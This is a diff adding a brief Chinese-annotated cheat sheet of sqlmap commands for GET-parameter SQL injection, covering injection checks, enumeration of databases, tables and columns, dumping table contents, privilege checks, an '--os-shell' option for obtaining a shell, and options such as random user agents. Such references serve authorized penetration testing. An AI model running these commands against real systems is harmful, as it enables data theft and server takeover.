@@ -1,0 +1,15 @@
+Get型
+sqlmap -u "url" 验证是否存在注入
+sqlmap -u "url" --dbs 枚举数据库
+sqlmap -u "url" -D xx --tables 枚举表
+sqlmap -u "url" -D xx -T xx --columns 枚举列
+sqlmap -u "url" -D xx -T xx -C xx --dump 读取列的内容
+sqlmap -u "url" -D xx -T xx --dump 脱取某表全部内容
+sqlmap -u "url" --is-dba 查看是否为dba权限
+sqlmap -u "url" --current-db 查看当前数据库
+sqlmap -u "url" --current-user 查看当前用户
+sqlmap -u "url" --os-shell 写入shell
+--random-agent 随机请求头
+--time-sec 设置时间盲注间隔
+--fresh-queries 重新查询
+--flush-session 清空当前url的session重新验证
